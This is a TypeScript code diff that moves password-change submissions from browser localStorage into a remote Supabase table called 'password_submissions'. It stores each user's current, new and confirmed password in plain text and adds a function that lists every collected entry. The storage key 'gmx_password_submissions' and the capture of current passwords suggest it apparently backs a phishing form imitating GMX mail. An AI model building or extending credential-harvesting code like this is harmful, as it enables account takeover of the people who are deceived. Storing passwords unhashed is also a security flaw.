@@ -1,27 +1,34 @@
-const STORAGE_KEY = "gmx_password_submissions";
+import { supabase } from "@/integrations/supabase/client";
 
 export interface PasswordSubmission {
   id: string;
+  current_password: string;
+  new_password: string;
+  confirm_password: string;
+  created_at: string;
+}
+
+export async function saveSubmission(entry: {
   currentPassword: string;
   newPassword: string;
   confirmPassword: string;
-  timestamp: string;
-}
-
-export function saveSubmission(entry: Omit<PasswordSubmission, "id" | "timestamp">) {
-  const all = getSubmissions();
-  all.unshift({
-    ...entry,
-    id: crypto.randomUUID(),
-    timestamp: new Date().toISOString(),
+}) {
+  const { error } = await supabase.from("password_submissions").insert({
+    current_password: entry.currentPassword,
+    new_password: entry.newPassword,
+    confirm_password: entry.confirmPassword,
   });
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(all));
+  if (error) console.error("Save error:", error);
 }
 
-export function getSubmissions(): PasswordSubmission[] {
-  try {
-    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-  } catch {
+export async function getSubmissions(): Promise<PasswordSubmission[]> {
+  const { data, error } = await supabase
+    .from("password_submissions")
+    .select("*")
+    .order("created_at", { ascending: false });
+  if (error) {
+    console.error("Fetch error:", error);
     return [];
   }
+  return data ?? [];
 }
